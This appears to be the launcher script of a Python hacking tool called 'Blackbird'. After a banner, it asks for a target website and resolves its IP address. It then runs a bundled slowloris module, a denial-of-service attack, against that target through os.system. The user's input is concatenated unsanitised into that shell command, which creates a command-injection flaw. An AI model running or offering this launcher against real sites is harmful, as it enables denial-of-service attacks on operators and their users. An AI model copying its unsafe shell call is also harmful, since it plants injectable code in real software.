import sys
import os
import time
import random
import socket
import getpass
os.system("clear")
time.sleep(1)
print (" ")
print( " ")
os.system(" figlet -c Blackbird | lolcat")
print ("                    Tool Created by @Dankshiku | @Kevin696 ")
print(" ")
print (" ")
print( " ")
target = input(" Target (ex: www.example.com) : ")
os.system("clear")
print(" ")
os.system(" figlet -c Blackbird | lolcat")
print ("                     ------------------------------------")
print(f'                    | Target IP address : {socket.gethostbyname(target)} |')
print ("                     ------------------------------------")
print (" ")
print (" ")
os.system("python module/slowloris.py "+target+"")

